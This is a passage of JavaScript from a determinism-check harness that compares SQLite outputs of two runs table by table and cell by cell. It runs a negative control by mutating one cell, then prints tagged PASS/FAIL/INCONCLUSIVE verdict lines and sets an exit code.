          if (!firstDiff && x.logical && y.logical) { const t = Object.keys(x.logical.per).find(k => !y.logical.per[k] || x.logical.per[k].hash !== y.logical.per[k].hash); firstDiff = x.path + ' table=' + t; } }
        if (x.bytes !== y.bytes) { bytesEq = false;
          let o = 0; const n = Math.min(x.buf.length, y.buf.length); while (o < n && x.buf[o] === y.buf[o]) o++;
          console.log('§NOAI_C3_BYTE_DIFF ' + x.path + ' lenA=' + x.blen + ' lenB=' + y.blen + ' first_diff_offset=' + o); } });
      const emEq = A.em === B.em;
      if (!logicalEq) {
        const x = A.lh[0], y = B.lh[0];
        const diffT = Object.keys(x.logical.per).filter(k => !y.logical.per[k] || x.logical.per[k].hash !== y.logical.per[k].hash);
        const sameT = Object.keys(x.logical.per).filter(k => !diffT.includes(k));
        console.log('§NOAI_C3_DIFF differing_tables=' + JSON.stringify(diffT) + ' identical_tables=' + sameT.length + '/' + Object.keys(x.logical.per).length +
          ' identical_rows=' + sameT.reduce((s2, k) => s2 + x.logical.per[k].rows, 0) + '/' + x.logical.rows);
        const cd = cellDiffs(SQL, x.buf, y.buf, diffT);
        cd.forEach(d => console.log('§NOAI_C3_CELL ' + d));
        // INFORMATIONAL (does not change the strict verdict): is every differing cell an ISO-8601 wall-clock stamp?
        console.log('§NOAI_C3_DIFF_CLASS differing_cells=' + cd.total + ' non_timestamp_cells=' + cd.nonTimestamp +
          ' => ' + (cd.nonTimestamp === 0 ? 'ONLY wall-clock timestamp cells differ; model rows identical' : 'NON-timestamp content differs'));
      }
      // negative control: mutate one cell in A's first sqlite leaf; logical comparison must see it
      const first = A.lh.find(x => x.logical && x.logical.rows > 0);
      const db = new SQL.Database(new Uint8Array(first.buf));
      const tbl = Object.keys(first.logical.per).find(k => first.logical.per[k].rows > 0);
      const colinfo = db.exec('PRAGMA table_info("' + tbl + '")')[0].values;
      const col = (colinfo.find(c => /TEXT|CHAR|CLOB/i.test(c[2])) || colinfo[0])[1];
      db.run('UPDATE "' + tbl + '" SET "' + col + '" = \'MUTATED\' WHERE rowid=(SELECT min(rowid) FROM "' + tbl + '")');
      const mut = Buffer.from(db.export()); db.close();
      const mh = await logicalHash(SQL, mut);
      negC3 = !!mh && mh.hash !== first.logical.hash && mh.per[tbl].hash !== first.logical.per[tbl].hash;
      console.log('§NOAI_DETERMINISM_NEGCTL mutated table=' + tbl + ' col=' + col + ' logical_hash_changed=' + negC3 + ' => ' + (negC3 ? 'caught' : 'WRONG'));
      v3 = !negC3 ? 'WRONG' : (logicalEq && emEq) ? 'PASS' : 'FAIL';
      console.log('§NOAI_DETERMINISM verdict=' + v3 + ' rows=' + rowsA + ' elements=' + A.em + '/' + B.em + ' masked_ts_cells=' + maskedA + '/' + maskedB + ' (iso-timestamp cells masked) logical_equal=' + logicalEq + ' bytes_equal=' + bytesEq +
        (firstDiff ? ' first_diff=' + firstDiff : '') + ' sha_A=' + A.lh.map(x => x.bytes.slice(0, 12)).join(',') + ' sha_B=' + B.lh.map(x => x.bytes.slice(0, 12)).join(',') +
        ' negctl=' + (negC3 ? 'caught' : 'WRONG'));
    }
    if (v3 === 'VACUOUS' || v3 === 'INCONCLUSIVE') console.log('§NOAI_DETERMINISM verdict=' + v3 + ' runs=' + R.map(r => r.done).join(',') + ' rows=' + rowsA);
  } catch (e) { console.log('§NOAI_DETERMINISM verdict=INCONCLUSIVE error=' + e.message); }
  verdicts.C3 = v3;
  server.close();

  const vs = Object.values(verdicts);
  const okv = v => v === 'PASS' || v === 'PASS_WITH_DISCLOSED';
  const final = vs.includes('FAIL') ? 'FAIL' : !vs.every(okv) ? 'INCONCLUSIVE' : vs.includes('PASS_WITH_DISCLOSED') ? 'PASS_WITH_DISCLOSED' : 'PASS';
  console.log('§NOAI_VERDICT verdict=' + final + ' C1=' + verdicts.C1 + ' C2=' + verdicts.C2 + ' C3=' + verdicts.C3);
  process.exitCode = okv(final) ? 0 : 1;
  setTimeout(() => process.exit(process.exitCode), 200);
})().catch(e => { console.log('§NOAI_VERDICT verdict=INCONCLUSIVE fatal=' + (e && e.stack || e)); process.exit(2); });
